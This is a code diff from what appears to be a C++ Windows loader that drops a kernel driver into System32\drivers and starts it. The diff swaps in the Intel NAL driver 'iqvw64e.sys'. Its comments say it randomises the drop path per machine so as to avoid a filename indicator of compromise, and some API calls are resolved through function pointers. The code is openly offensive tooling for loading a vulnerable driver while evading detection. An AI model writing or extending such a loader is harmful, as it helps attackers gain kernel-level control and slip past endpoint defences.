@@ -22,7 +22,7 @@
 // ── Per-machine hardware fingerprint ─────────────────────────────────────────
 // Mixes volume serial number + CPUID family/stepping into a stable DWORD.
 // Used to generate a machine-unique driver drop path that avoids a predictable
-// filename IOC like "fekern.sys" while remaining stable across reboots.
+// filename IOC like "iqvw64e.sys" while remaining stable across reboots.
 static DWORD GetHwKey() {
     DWORD serial = 0;
     using GVI_fn = BOOL(WINAPI*)(LPCSTR, LPSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);
@@ -35,7 +35,7 @@ static DWORD GetHwKey() {
 
 // ── Driver drop path ──────────────────────────────────────────────────────────
 // Generates a machine-stable path like %SystemRoot%\System32\drivers\A3F19C2B.sys.
-// Copy fekern.sys (or your chosen driver) to this path before launching.
+// Copy iqvw64e.sys (Intel NAL) to this path before launching.
 static const char* GetDriverPath() {
     static char s_path[MAX_PATH] = {};
     static bool s_ready = false;
@@ -81,7 +81,7 @@ static bool IsProcessRunning(const char* exeName) {
 }
 
 static bool IsDriverLoaded() {
-    HANDLE h = CreateFileA("\\\\.\\fekern_00",
+    HANDLE h = CreateFileA("\\\\.\\Nal",
         GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
     bool ok = (h != INVALID_HANDLE_VALUE);
     if (ok) CloseHandle(h);
@@ -152,7 +152,7 @@ static bool StartDriver() {
 
     if (GetFileAttributesA(drvPath) == INVALID_FILE_ATTRIBUTES) {
         std::cout << "[!] Driver file not found at: " << drvPath << "\n";
-        std::cout << "    Copy fekern.sys to that path and retry.\n";
+        std::cout << "    Copy iqvw64e.sys to that path and retry.\n";
         pCloseServiceHandle(hSCM);
         return false;
     }
